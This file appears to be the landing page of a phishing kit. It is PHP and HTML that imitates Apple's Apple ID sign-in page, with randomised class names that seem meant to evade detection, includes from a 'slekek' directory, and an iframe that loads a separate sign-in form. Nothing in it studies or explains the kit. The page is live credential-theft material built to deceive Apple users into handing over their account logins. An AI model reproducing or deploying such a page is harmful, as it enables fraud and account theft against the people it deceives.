<?php
require '../slekek/lange.php';
require '../slekek/acc.php';


?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo $_LANG['SIGNIN'];?></title>
<link rel="shortcut icon" href="files/img/favicon.ico" type="image/x-icon" >
<link href="files/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="files/css/Second.css" rel="stylesheet" type="text/css">
<link href="files/css/Fonts.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent kodwiefu7y3278rhiwfueojk">
<div id="ojeihu3fe7wy8tg3uy2 content">
<div class="27rygwfeubhjwkegr3giufwe bdd45">



<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="slekekc0de2k18 HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="memexx83y78refwygi MobMenIcon MobMenIcon-top">
	<span class="o2ije3rhu7f8regiuwehbjr3 MobMenIcon-crust MobMenIcon-crust-top"></span> 
</span> 
<span class="memexx83y78refwygi MobMenIcon MobMenIcon-bottom">
	<span class="o2ije3rhu7f8regiuwehbjr3 MobMenIcon-crust MobMenIcon-crust-bottom"></span> 
</span>
</label>
</li>
<li class="slekekc0de2k18 HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
<ul class="HeaderObjList">
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item1" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item2" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item3" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item4" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item5" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item6" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item7" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item8" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item9" href="#"></a></li>
<li class="slekekc0de2k18 HeaderObj memexx12894djknn32rwedv HeaderItem pelii2r3fewhuief3r2ewf"><a class="jjqiuhygfewyuv32rfwe HeaderLink r378gfweiub Item10" href="#"></a></li>
</ul>
</div>
</nav>










<div class="subnav">
<div class="container">
<div class="title pull-left">Apple&nbsp;ID</div>
<div class="menu-wrapper pull-right">
<ul class="menu">
<li class="item active"><a class="btn btn-link btn-signin" href="#"><?php echo $_LANG['SIGNIN'];?></a></li>
<li class="item"><a class="btn btn-link btn-create" href="#"><?php echo $_LANG['SIGNUP'];?></a></li>
<li class="item"><a class="btn btn-link btn-faq" href="#">FAQ</a></li>
</ul>
</div>
</div>
</div>
<div class="paws signin">
<h1 class="LoginTitle">Apple&nbsp;ID</h1>
<div class="LoginIframe" id="auth-container" style="position: relative;">
<iframe width="100%" height="100%" name="login" id="login" src="files/signin.php" frameborder="0" scrolling="no"></iframe>
</div>
</div>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="container">
<div class="forgot" id="forgot-link"><a href="#"><?php echo $_LANG['FORGOT'];?></a></div>
<div class="flex home-content">
<h2 id="Title" class="title separator"><?php echo $_LANG['TITLE'];?></h2>
<div id="TitleMsg" class="intro"><?php echo $_LANG['TITLE2'];?></div>
<div id="LearnMore" class="intro"><a class="button faq-link" href="#"><?php echo $_LANG['TITLE3'];?><i class="icon Righty"></i></a></div>
<div id="AppIconsWrapper" class="apps text-center"><img class="ApplicationIcons" src="files/img/icons.jpg" height="68" width="656"></div>
<div id="CreateAccount" class="intro create show"><a class="button create-link" href="#"><?php echo $_LANG['SIGNUP'];?><i class="icon Righty"></i></a></div>
</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level"><?php echo $_LANG['FOOTERLINE1'];?></div>
</div>
<div class="FooterLine2">
<ul class="oijfhuewgy menu ji3ruihygfeuw">
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['FOOTERLINE21'];?></a></li>
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['FOOTERLINE22'];?></a></li>
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['FOOTERLINE23'];?></a></li>
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['FOOTERLINE24'];?></a></li>
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['FOOTERLINE25'];?></a></li>
</ul>
</div>
<div class="FooterLine3"><?php echo $_LANG['COPYR'];?>
<ul class="oijfhuewgy menu ji3ruihygfeuw">
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['TERMCN'];?></a></li>
<li class="mqwduhigfefw873giufewb item e2387ry8ewyfgibh"><a href="#"><?php echo $_LANG['PRVPLCY'];?></a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>